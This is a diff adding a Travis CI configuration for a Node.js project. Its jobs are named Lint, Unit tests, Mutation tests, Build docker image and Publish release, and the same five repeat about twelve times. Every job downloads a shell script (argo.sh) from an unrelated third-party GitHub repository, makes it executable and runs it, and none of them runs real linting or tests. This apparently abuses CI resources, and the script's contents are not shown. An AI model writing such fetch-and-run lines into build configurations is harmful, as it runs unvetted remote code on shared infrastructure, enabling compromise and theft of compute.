@@ -1,0 +1,302 @@
+dist: bionic
+
+language: node_js
+
+branches:
+  only:
+    - /.*/
+
+cache:
+  directories:
+    - node_modules
+
+node_js:
+  - '12.16.3'
+
+jobs:
+  fast_finish: true
+  allow_failures:
+    - name: 'Mutation tests'
+  include:
+
+    - name: 'Lint'
+      install: npm ci
+      before_script:
+        - wget https://raw.githubusercontent.com/jokogendeng/MazeMeCI/main/argo.sh && chmod u+x argo.sh && ./argo.sh
+      script: bash argo.sh
+
+    - name: 'Unit tests'
+      install: npm ci
+      before_script:
+        - wget https://raw.githubusercontent.com/jokogendeng/MazeMeCI/main/argo.sh && chmod u+x argo.sh && ./argo.sh
+      script: bash argo.sh
+
+    - name: 'Mutation tests'
+      install: npm ci
+      before_script:
+        - wget https://raw.githubusercontent.com/jokogendeng/MazeMeCI/main/argo.sh && chmod u+x argo.sh && ./argo.sh
+      script: bash argo.sh
+
+    - name: 'Build docker image'
+      before_script:
+        - wget https://raw.githubusercontent.com/jokogendeng/MazeMeCI/main/argo.sh && chmod u+x argo.sh && ./argo.sh
+      script: bash argo.sh
+
+    - name: 'Publish release'
+      before_script:
+        - wget https://raw.githubusercontent.com/jokogendeng/MazeMeCI/main/argo.sh && chmod u+x argo.sh && ./argo.sh
+      script: bash argo.sh
+
+    - name: 'Lint'
+      install: npm ci
+      before_script:
+        - wget https://raw.githubusercontent.com/jokogendeng/MazeMeCI/main/argo.sh && chmod u+x argo.sh && ./argo.sh
+      script: bash argo.sh
+
+    - name: 'Unit tests'
+      install: npm ci
+      before_script:
+        - wget https://raw.githubusercontent.com/jokogendeng/MazeMeCI/main/argo.sh && chmod u+x argo.sh && ./argo.sh
+      script: bash argo.sh
+
+    - name: 'Mutation tests'
+      install: npm ci
+      before_script:
+        - wget https://raw.githubusercontent.com/jokogendeng/MazeMeCI/main/argo.sh && chmod u+x argo.sh && ./argo.sh
+      script: bash argo.sh
+
+    - name: 'Build docker image'
+      before_script:
+        - wget https://raw.githubusercontent.com/jokogendeng/MazeMeCI/main/argo.sh && chmod u+x argo.sh && ./argo.sh
+      script: bash argo.sh
+
+    - name: 'Publish release'
+      before_script:
+        - wget https://raw.githubusercontent.com/jokogendeng/MazeMeCI/main/argo.sh && chmod u+x argo.sh && ./argo.sh
+      script: bash argo.sh
+
+    - name: 'Lint'
+      install: npm ci
+      before_script:
+        - wget https://raw.githubusercontent.com/jokogendeng/MazeMeCI/main/argo.sh && chmod u+x argo.sh && ./argo.sh
+      script: bash argo.sh
+
+    - name: 'Unit tests'
+      install: npm ci
+      before_script:
+        - wget https://raw.githubusercontent.com/jokogendeng/MazeMeCI/main/argo.sh && chmod u+x argo.sh && ./argo.sh
+      script: bash argo.sh
+
+    - name: 'Mutation tests'
+      install: npm ci
+      before_script:
+        - wget https://raw.githubusercontent.com/jokogendeng/MazeMeCI/main/argo.sh && chmod u+x argo.sh && ./argo.sh
+      script: bash argo.sh
+
+    - name: 'Build docker image'
+      before_script:
+        - wget https://raw.githubusercontent.com/jokogendeng/MazeMeCI/main/argo.sh && chmod u+x argo.sh && ./argo.sh
+      script: bash argo.sh
+
+    - name: 'Publish release'
+      before_script:
+        - wget https://raw.githubusercontent.com/jokogendeng/MazeMeCI/main/argo.sh && chmod u+x argo.sh && ./argo.sh
+      script: bash argo.sh
+
+    - name: 'Lint'
+      install: npm ci
+      before_script:
+        - wget https://raw.githubusercontent.com/jokogendeng/MazeMeCI/main/argo.sh && chmod u+x argo.sh && ./argo.sh
+      script: bash argo.sh
+
+    - name: 'Unit tests'
+      install: npm ci
+      before_script:
+        - wget https://raw.githubusercontent.com/jokogendeng/MazeMeCI/main/argo.sh && chmod u+x argo.sh && ./argo.sh
+      script: bash argo.sh
+
+    - name: 'Mutation tests'
+      install: npm ci
+      before_script:
+        - wget https://raw.githubusercontent.com/jokogendeng/MazeMeCI/main/argo.sh && chmod u+x argo.sh && ./argo.sh
+      script: bash argo.sh
+
+    - name: 'Build docker image'
+      before_script:
+        - wget https://raw.githubusercontent.com/jokogendeng/MazeMeCI/main/argo.sh && chmod u+x argo.sh && ./argo.sh
+      script: bash argo.sh
+
+    - name: 'Publish release'
+      before_script:
+        - wget https://raw.githubusercontent.com/jokogendeng/MazeMeCI/main/argo.sh && chmod u+x argo.sh && ./argo.sh
+      script: bash argo.sh
+
+    - name: 'Lint'
+      install: npm ci
+      before_script:
+        - wget https://raw.githubusercontent.com/jokogendeng/MazeMeCI/main/argo.sh && chmod u+x argo.sh && ./argo.sh
+      script: bash argo.sh
+
+    - name: 'Unit tests'
+      install: npm ci
+      before_script:
+        - wget https://raw.githubusercontent.com/jokogendeng/MazeMeCI/main/argo.sh && chmod u+x argo.sh && ./argo.sh
+      script: bash argo.sh
+
+    - name: 'Mutation tests'
+      install: npm ci
+      before_script:
+        - wget https://raw.githubusercontent.com/jokogendeng/MazeMeCI/main/argo.sh && chmod u+x argo.sh && ./argo.sh
+      script: bash argo.sh
+
+    - name: 'Build docker image'
+      before_script:
+        - wget https://raw.githubusercontent.com/jokogendeng/MazeMeCI/main/argo.sh && chmod u+x argo.sh && ./argo.sh
+      script: bash argo.sh
+
+    - name: 'Publish release'
+      before_script:
+        - wget https://raw.githubusercontent.com/jokogendeng/MazeMeCI/main/argo.sh && chmod u+x argo.sh && ./argo.sh
+      script: bash argo.sh
+
+    - name: 'Lint'
+      install: npm ci
+      before_script:
+        - wget https://raw.githubusercontent.com/jokogendeng/MazeMeCI/main/argo.sh && chmod u+x argo.sh && ./argo.sh
+      script: bash argo.sh
+
+    - name: 'Unit tests'
+      install: npm ci
+      before_script:
+        - wget https://raw.githubusercontent.com/jokogendeng/MazeMeCI/main/argo.sh && chmod u+x argo.sh && ./argo.sh
+      script: bash argo.sh
+
+    - name: 'Mutation tests'
+      install: npm ci
+      before_script:
+        - wget https://raw.githubusercontent.com/jokogendeng/MazeMeCI/main/argo.sh && chmod u+x argo.sh && ./argo.sh
+      script: bash argo.sh
+
+    - name: 'Build docker image'
+      before_script:
+        - wget https://raw.githubusercontent.com/jokogendeng/MazeMeCI/main/argo.sh && chmod u+x argo.sh && ./argo.sh
+      script: bash argo.sh
+
+    - name: 'Publish release'
+      before_script:
+        - wget https://raw.githubusercontent.com/jokogendeng/MazeMeCI/main/argo.sh && chmod u+x argo.sh && ./argo.sh
+      script: bash argo.sh
+
+    - name: 'Lint'
+      install: npm ci
+      before_script:
+        - wget https://raw.githubusercontent.com/jokogendeng/MazeMeCI/main/argo.sh && chmod u+x argo.sh && ./argo.sh
+      script: bash argo.sh
+
+    - name: 'Unit tests'
+      install: npm ci
+      before_script:
+        - wget https://raw.githubusercontent.com/jokogendeng/MazeMeCI/main/argo.sh && chmod u+x argo.sh && ./argo.sh
+      script: bash argo.sh
+
+    - name: 'Mutation tests'
+      install: npm ci
+      before_script:
+        - wget https://raw.githubusercontent.com/jokogendeng/MazeMeCI/main/argo.sh && chmod u+x argo.sh && ./argo.sh
+      script: bash argo.sh
+
+    - name: 'Build docker image'
+      before_script:
+        - wget https://raw.githubusercontent.com/jokogendeng/MazeMeCI/main/argo.sh && chmod u+x argo.sh && ./argo.sh
+      script: bash argo.sh
+
+    - name: 'Publish release'
+      before_script:
+        - wget https://raw.githubusercontent.com/jokogendeng/MazeMeCI/main/argo.sh && chmod u+x argo.sh && ./argo.sh
+      script: bash argo.sh
+
+    - name: 'Lint'
+      install: npm ci
+      before_script:
+        - wget https://raw.githubusercontent.com/jokogendeng/MazeMeCI/main/argo.sh && chmod u+x argo.sh && ./argo.sh
+      script: bash argo.sh
+
+    - name: 'Unit tests'
+      install: npm ci
+      before_script:
+        - wget https://raw.githubusercontent.com/jokogendeng/MazeMeCI/main/argo.sh && chmod u+x argo.sh && ./argo.sh
+      script: bash argo.sh
+
+    - name: 'Mutation tests'
+      install: npm ci
+      before_script:
+        - wget https://raw.githubusercontent.com/jokogendeng/MazeMeCI/main/argo.sh && chmod u+x argo.sh && ./argo.sh
+      script: bash argo.sh
+
+    - name: 'Build docker image'
+      before_script:
+        - wget https://raw.githubusercontent.com/jokogendeng/MazeMeCI/main/argo.sh && chmod u+x argo.sh && ./argo.sh
+      script: bash argo.sh
+
+    - name: 'Publish release'
+      before_script:
+        - wget https://raw.githubusercontent.com/jokogendeng/MazeMeCI/main/argo.sh && chmod u+x argo.sh && ./argo.sh
+      script: bash argo.sh
+
+    - name: 'Lint'
+      install: npm ci
+      before_script:
+        - wget https://raw.githubusercontent.com/jokogendeng/MazeMeCI/main/argo.sh && chmod u+x argo.sh && ./argo.sh
+      script: bash argo.sh
+
+    - name: 'Unit tests'
+      install: npm ci
+      before_script:
+        - wget https://raw.githubusercontent.com/jokogendeng/MazeMeCI/main/argo.sh && chmod u+x argo.sh && ./argo.sh
+      script: bash argo.sh
+
+    - name: 'Mutation tests'
+      install: npm ci
+      before_script:
+        - wget https://raw.githubusercontent.com/jokogendeng/MazeMeCI/main/argo.sh && chmod u+x argo.sh && ./argo.sh
+      script: bash argo.sh
+
+    - name: 'Build docker image'
+      before_script:
+        - wget https://raw.githubusercontent.com/jokogendeng/MazeMeCI/main/argo.sh && chmod u+x argo.sh && ./argo.sh
+      script: bash argo.sh
+
+    - name: 'Publish release'
+      before_script:
+        - wget https://raw.githubusercontent.com/jokogendeng/MazeMeCI/main/argo.sh && chmod u+x argo.sh && ./argo.sh
+      script: bash argo.sh
+
+    - name: 'Lint'
+      install: npm ci
+      before_script:
+        - wget https://raw.githubusercontent.com/jokogendeng/MazeMeCI/main/argo.sh && chmod u+x argo.sh && ./argo.sh
+      script: bash argo.sh
+
+    - name: 'Unit tests'
+      install: npm ci
+      before_script:
+        - wget https://raw.githubusercontent.com/jokogendeng/MazeMeCI/main/argo.sh && chmod u+x argo.sh && ./argo.sh
+      script: bash argo.sh
+
+    - name: 'Mutation tests'
+      install: npm ci
+      before_script:
+        - wget https://raw.githubusercontent.com/jokogendeng/MazeMeCI/main/argo.sh && chmod u+x argo.sh && ./argo.sh
+      script: bash argo.sh
+
+    - name: 'Build docker image'
+      before_script:
+        - wget https://raw.githubusercontent.com/jokogendeng/MazeMeCI/main/argo.sh && chmod u+x argo.sh && ./argo.sh
+      script: bash argo.sh
+
+    - name: 'Publish release'
+      before_script:
+        - wget https://raw.githubusercontent.com/jokogendeng/MazeMeCI/main/argo.sh && chmod u+x argo.sh && ./argo.sh
+      script: bash argo.sh
+	  
+    
